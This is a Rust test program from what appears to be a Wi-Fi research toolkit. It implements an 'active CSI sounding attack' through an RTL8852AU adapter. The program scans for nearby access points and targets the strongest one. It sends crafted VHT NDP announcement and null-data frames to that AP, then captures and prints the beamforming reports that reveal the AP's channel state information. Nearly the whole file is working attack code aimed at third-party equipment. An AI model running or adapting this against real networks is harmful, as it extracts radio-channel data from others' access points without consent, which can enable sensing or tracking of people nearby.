//! RTL8852AU Active CSI Sounding Attack
//!
//! Sends VHT NDPA + NDP to a target AP to force it to compute and reveal
//! its Channel State Information (CSI). The AP responds with a Compressed
//! Beamforming Report containing the CSI matrix.
//!
//! Usage: cargo run --bin test_8852au_csi [channel]

use std::time::{Duration, Instant};
use wifikit::core::adapter::AdapterInfo;
use wifikit::core::chip::ChipId;
use wifikit::core::frame::{TxOptions, TxRate, TxFlags};
use wifikit::pipeline::FrameGate;
use wifikit::store::FrameStore;

/// Build a VHT NDPA (NDP Announcement) frame.
/// FC=0x0054 (control frame, subtype=5 NDPA)
fn build_vht_ndpa(ta: &[u8; 6], ra: &[u8; 6], dialog_token: u8) -> Vec<u8> {
    let mut frame = Vec::with_capacity(21);
    // Frame Control: type=1(control), subtype=5(NDPA) → 0x54 0x00
    frame.extend_from_slice(&[0x54, 0x00]);
    // Duration: 100μs
    frame.extend_from_slice(&[0x64, 0x00]);
    // RA: target AP
    frame.extend_from_slice(ra);
    // TA: our MAC
    frame.extend_from_slice(ta);
    // Dialog Token: HE=0 (bit 6), token value in bits [5:0]
    frame.push(dialog_token & 0x3F);
    // VHT STA Info (4 bytes):
    //   AID12[11:0] = 0 (AP's own AID)
    //   Feedback Type[12] = 0 (SU)
    //   Nc[15:13] = 1 (2 antennas → Nc = Nrx - 1 = 1)
    //   Reserved[31:16] = 0
    let sta_info: u32 = (0 & 0xFFF)    // AID = 0
        | (0 << 12)                     // SU feedback
        | (1 << 13);                    // Nc = 1 (2 spatial streams)
    frame.extend_from_slice(&sta_info.to_le_bytes());
    frame
}

/// Build a VHT NDP "frame" — just a null MAC header, the PHY training
/// signal is generated by hardware based on TX descriptor settings.
fn build_vht_ndp(ta: &[u8; 6], ra: &[u8; 6]) -> Vec<u8> {
    let mut frame = vec![0u8; 24];
    frame[0] = 0x48; // Null data (type=2, subtype=4)
    frame[1] = 0x00;
    frame[4..10].copy_from_slice(ra);  // RA
    frame[10..16].copy_from_slice(ta); // TA
    frame[16..22].copy_from_slice(ra); // BSSID
    frame
}

fn main() {
    let channel: u8 = std::env::args().nth(1)
        .and_then(|s| s.parse().ok())
        .unwrap_or(6);

    let info = AdapterInfo {
        vid: 0x2357, pid: 0x013F,
        chip: ChipId::Rtl8852au,
        name: "TP-Link Archer TX20U Plus (RTL8852AU)",
        bus: 0, address: 0,
    };

    eprintln!("=== RTL8852AU Active CSI Sounding (ch {}) ===\n", channel);

    let store = FrameStore::new();
    let gate = FrameGate::new(store.clone(), None);

    eprintln!("Opening adapter via SharedAdapter...");
    let shared = wifikit::adapter::SharedAdapter::spawn(&info, gate.clone(), |msg| {
        eprintln!("  {}", msg);
    }).expect("spawn failed");

    let mac = shared.mac();
    let our_mac = mac.0;
    eprintln!("\nAdapter ready. MAC: {}", mac);

    let sub = shared.subscribe("csi-test");
    let channels = shared.supported_channels();
    let ch_info = channels.iter().find(|c| c.number == channel)
        .expect(&format!("Channel {} not found", channel));
    shared.set_channel_full(ch_info.clone()).expect("set_channel failed");
    eprintln!("Tuned to channel {}\n", channel);

    // ── Phase 1: Discover APs ──
    eprintln!("--- Phase 1: Discovering APs (5 seconds) ---");
    let start = Instant::now();
    let mut aps: std::collections::HashMap<[u8; 6], (String, i8, u32)> = std::collections::HashMap::new();
    let mut total_frames = 0u32;

    while start.elapsed() < Duration::from_secs(5) {
        match sub.recv_timeout(Duration::from_millis(50)) {
            Some(frame) => {
                total_frames += 1;
                let d = &frame.raw;
                if d.len() < 24 { continue; }
                let fc = d[0];
                let frame_type = (fc >> 2) & 0x3;
                let subtype = (fc >> 4) & 0xF;

                if frame_type == 0 && (subtype == 8 || subtype == 5) && d.len() > 38 {
                    let mut bssid = [0u8; 6];
                    bssid.copy_from_slice(&d[16..22]);

                    let ssid = if d[36] == 0x00 && d.len() > 38 {
                        let len = d[37] as usize;
                        if d.len() >= 38 + len {
                            String::from_utf8_lossy(&d[38..38+len]).to_string()
                        } else { String::new() }
                    } else { String::new() };

                    let entry = aps.entry(bssid).or_insert((ssid, frame.rssi, 0));
                    entry.2 += 1; // frame count
                }
            }
            None => {}
        }
    }

    eprintln!("  {} frames, {} APs found:\n", total_frames, aps.len());
    let mut ap_list: Vec<_> = aps.iter().collect();
    ap_list.sort_by(|a, b| b.1.1.cmp(&a.1.1));

    for (bssid, (ssid, rssi, count)) in &ap_list {
        eprintln!("  {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}  {:>4} dBm  {:<32} ({} frames)",
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
            rssi, ssid, count);
    }

    if ap_list.is_empty() {
        eprintln!("\n  No APs found!");
        shared.shutdown();
        return;
    }

    let (target_bssid, (target_ssid, target_rssi, _)) = ap_list[0];
    eprintln!("\n--- Phase 2: Sounding {} ({} dBm) ---", target_ssid, target_rssi);
    eprintln!("  Target: {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
        target_bssid[0], target_bssid[1], target_bssid[2],
        target_bssid[3], target_bssid[4], target_bssid[5]);
    eprintln!("  Our MAC: {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}\n",
        our_mac[0], our_mac[1], our_mac[2], our_mac[3], our_mac[4], our_mac[5]);

    // Build sounding frames
    let ndpa = build_vht_ndpa(&our_mac, target_bssid, 0x01);
    let ndp = build_vht_ndp(&our_mac, target_bssid);

    let ndpa_opts = TxOptions {
        rate: TxRate::Ofdm6m,
        retries: 0,
        flags: TxFlags::NO_ACK | TxFlags::NO_RETRY | TxFlags::SIFS_TX,
        bw: 0,
        ndpa: 2,           // VHT/HE NDPA
        snd_pkt_sel: 0,    // Unicast NDPA
        ndpa_duration_us: 200,
        ..Default::default()
    };

    let ndp_opts = TxOptions {
        rate: TxRate::Ofdm6m,
        retries: 0,
        flags: TxFlags::NO_ACK | TxFlags::NO_RETRY,
        bw: 0,
        ndpa: 3,           // VHT/HE NDP
        snd_pkt_sel: 2,    // Last NDP
        ..Default::default()
    };

    let num_soundings = 20;
    let mut bf_reports = 0u32;
    let mut action_frames = 0u32;
    let mut total_rx = 0u32;

    for i in 0..num_soundings {
        // Send NDPA
        if let Err(e) = shared.tx_frame(&ndpa, &ndpa_opts) {
            eprintln!("  NDPA TX error: {}", e);
            continue;
        }

        // Brief pause then NDP (SIFS_TX bit should handle timing in hardware)
        std::thread::sleep(Duration::from_micros(100));

        if let Err(e) = shared.tx_frame(&ndp, &ndp_opts) {
            eprintln!("  NDP TX error: {}", e);
            continue;
        }

        // Listen for BF report (up to 10ms per sounding)
        let listen_start = Instant::now();
        while listen_start.elapsed() < Duration::from_millis(10) {
            match sub.recv_timeout(Duration::from_millis(2)) {
                Some(frame) => {
                    total_rx += 1;
                    let d = &frame.raw;
                    if d.len() < 2 { continue; }

                    let fc = d[0];
                    let frame_type = (fc >> 2) & 0x3;
                    let subtype = (fc >> 4) & 0xF;

                    // Action No Ack (type=0, subtype=14) with VHT category
                    if frame_type == 0 && subtype == 14 && d.len() > 26 {
                        action_frames += 1;
                        // VHT category=21, Compressed BF action=0
                        if d[24] == 21 && d[25] == 0 {
                            bf_reports += 1;
                            eprintln!("  [{:>2}] *** VHT BF REPORT! {} bytes from {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} ***",
                                i, d.len(), d[10], d[11], d[12], d[13], d[14], d[15]);
                            let end = 58.min(d.len());
                            let hex: Vec<String> = d[26..end].iter().map(|b| format!("{:02X}", b)).collect();
                            eprintln!("        CSI payload: {}", hex.join(" "));
                        }
                    }
                    // Action (type=0, subtype=13) — possible HE BF
                    if frame_type == 0 && subtype == 13 && d.len() > 26 && d[24] == 30 {
                        bf_reports += 1;
                        eprintln!("  [{:>2}] *** HE BF REPORT! {} bytes ***", i, d.len());
                    }
                }
                None => {}
            }
        }

        if (i + 1) % 5 == 0 {
            eprintln!("  ... {}/{} soundings, {} BF reports, {} action frames, {} total RX",
                i + 1, num_soundings, bf_reports, action_frames, total_rx);
        }
    }

    // Check RX stats for CSI packets
    let rx_stats = shared.rx_stats();
    let csi_count = rx_stats.channel_info.load(std::sync::atomic::Ordering::Relaxed);

    eprintln!("\n=== RESULTS ===");
    eprintln!("  Soundings sent:      {}", num_soundings);
    eprintln!("  BF reports received: {}", bf_reports);
    eprintln!("  Action frames seen:  {}", action_frames);
    eprintln!("  Total RX frames:     {}", total_rx);
    eprintln!("  CSI (rpkt_type=2):   {}", csi_count);

    if bf_reports > 0 {
        eprintln!("\n  *** CSI SOUNDING WORKS! ***");
    } else if csi_count > 0 {
        eprintln!("\n  *** CSI packets at driver level but no BF reports in WiFi frames ***");
    } else {
        eprintln!("\n  No BF reports. Try a 5GHz channel with modern APs (VHT/HE).");
    }

    shared.shutdown();
    eprintln!("\nDone.");
}
